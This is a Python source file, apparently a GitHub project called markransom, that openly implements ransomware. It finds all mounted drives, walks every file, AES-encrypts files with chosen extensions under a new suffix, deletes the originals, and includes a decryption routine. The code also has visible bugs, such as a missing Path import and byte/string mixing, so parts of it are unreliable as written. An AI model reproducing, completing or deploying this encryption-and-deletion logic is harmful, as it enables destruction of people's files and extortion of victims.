#!/usr/bin/env python
# -*- coding: utf-8 -*-
# markransom.py - decipher
# https://www.github.com/R3nt0n/markransom


__author__ = "r3nt0n"
__license__ = "GPL 3.0"
__version__ = "1.0.0"
__email__ = "r3nt0n@protonmail.com"
__status__ = "Development"

import os
from base64 import b64encode, b64decode

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def decipher(file_path, key, custom_ext):
    status = 1
    try:
        with open(file_path, 'rb') as f_crypt:
            cipher_data = f_crypt.read()
        iv = (cipher_data.split(':%:%:&:%:%:'))[0]
        cipher_text = (cipher_data.split(':%:%:&:%:%:'))[1]
        d = AES.new(key, AES.MODE_CBC, iv=iv)
        decipher_data = d.decrypt(cipher_text)
        decipher_data = b64decode(decipher_data)
        prev_name = file_path.rstrip(custom_ext)
        with open(prev_name, 'wb+') as f_plain:
            f_plain.write(decipher_data)
        os.remove(file_path)
        status = 0
    except:
        pass
    return status


def cipher(file_path, key, custom_ext):
    '''Encrypt data with AES(CBC mode).

       Arguments:
       data -- the data that will be encrypted.
       key -- the key for the encryption. For AES256, it has to be 32 bytes.
    '''
    status = 1
    try:
        with open(file_path, 'rb') as file_plain:
            data = file_plain.read()
            data = b64encode(data)
            c = AES.new(key, AES.MODE_CBC)
            pad_data = pad(data, c.block_size)
            cipher_text = c.encrypt(pad_data)  # Aquí tengo el mensaje cifrado
            cipher_data = c.iv + ':%:%:&:%:%:' + cipher_text
            with open(file_path + custom_ext, 'wb+') as file_crypted:
                file_crypted.write(cipher_data)
            os.remove(file_path)
            status = 0
    except:
        pass
    return status



def find_root_paths():
    '''Returns a list with all the partitions/mount points which are currently
       mounted on the system.'''
    if os.name == 'nt':
        possible_units = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        units_mounted = []
        for letter in possible_units:
            mountpoint = os.path.normpath(letter + ':/')
            if os.path.exists(mountpoint):
                units_mounted.append(mountpoint)
        root_paths = units_mounted
    else:
        root_paths = ['/']
    return root_paths


def find_script_mount_point():
    '''Returns the mount point where the script is located.'''
    scriptPath = os.path.abspath(__file__)
    scriptDir = os.path.dirname(scriptPath)
    os.chdir(scriptDir)
    while True:
        os.chdir('..')
        actualPath = os.path.normpath(os.getcwd())
        if os.path.ismount(actualPath):
            script_mount_point = actualPath
            break
    return script_mount_point


def find_files_and_do(units_mounted, extensions, key, script_abspath=os.path.abspath(__file__), action='encrypt', crypted_ext='.crypted'):
    '''Walk all units mounted in looking for files that matches one of the
       extensions. The actual script can be excluded.

       Returns a list of files encrypted, including the absolute path of each one.

       Arguments:
       units_mounted -- list of units that will be walked.
       extensions -- list of extensions that will be searched.
       key -- AES256 key to encrypt the data
       script_abspath -- absolute path to actual script (excludes it from encryption)
       action -- could be encrypt or decrypt
    '''
    crypted_file_list = []

    for unit in units_mounted:
        root_path = unit
        for root, dirs, files in os.walk(root_path, topdown=False):
            for name in files:
                abspath = (Path(root) / name)
                if abspath == script_abspath:
                    continue
                for extension in extensions:
                    if (name.endswith(extension)):
                        if action == 'encrypt':
                            status = cipher(abspath, key, crypted_ext)
                        elif action == 'decrypt':
                            status = decipher(abspath, key, crypted_ext)
                        if status == 1:
                            crypted_file_list.append(abspath)
                            break
    return crypted_file_list
